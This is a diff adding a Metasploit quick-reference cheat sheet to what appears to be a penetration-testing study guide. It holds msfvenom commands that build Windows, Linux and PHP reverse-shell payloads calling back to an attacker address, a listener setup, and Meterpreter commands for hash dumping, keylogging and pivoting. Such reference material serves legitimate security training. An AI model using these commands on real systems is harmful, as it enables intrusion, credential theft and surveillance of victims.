@@ -48,6 +48,69 @@
 
 ---
 
+## Quick Reference
+
+### Essential Commands
+```bash
+msfconsole                                    # Start Metasploit console
+search <term>                                 # Search for modules (e.g., search eternal)
+use <module>                                  # Select a module
+show options                                  # Display required/optional settings
+set <option> <value>                          # Set an option (e.g., set RHOST 10.10.10.5)
+exploit / run                                 # Execute the module
+sessions -l                                   # List active sessions
+sessions -i <id>                              # Interact with a session
+background / bg                               # Background current session (Ctrl+Z)
+```
+
+### Common Scenarios (msfvenom)
+```bash
+# Windows reverse TCP shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
+
+# Linux reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
+
+# PHP reverse shell (webshell upload)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
+
+# Catch with multi/handler
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.5
+set LPORT 4444
+exploit -j
+```
+
+### Key Meterpreter Commands
+| Command | Action |
+|---------|--------|
+| `sysinfo` | Show system information |
+| `getuid` | Show current user |
+| `ps` | List processes |
+| `migrate <PID>` | Migrate to another process |
+| `hashdump` | Dump password hashes (needs SYSTEM) |
+| `shell` | Drop to system shell |
+| `upload / download` | Transfer files |
+| `screenshot` | Capture screen |
+| `keyscan_start / keyscan_dump` | Keylogger |
+| `run post/windows/gather/enum_logged_on_users` | Post-exploitation module |
+| `portfwd add -l 8080 -p 80 -r 192.168.1.10` | Port forwarding (pivoting) |
+| `route add 192.168.1.0 255.255.255.0 <session>` | Route through session |
+
+### Key msfvenom Options
+| Flag | Purpose |
+|------|---------|
+| `-p` | Payload (e.g., `windows/meterpreter/reverse_tcp`) |
+| `-f` | Output format (exe, elf, raw, dll, aspx, war, python) |
+| `-e` | Encoder (⚠️ most are signatured, see Task 4.2 warning) |
+| `-o` | Output file |
+| `LHOST` | Attacker IP |
+| `LPORT` | Attacker listening port |
+| `--list payloads` | Show all available payloads |
+
+---
+
 # PHASE 1: FUNDAMENTALS
 
 ---
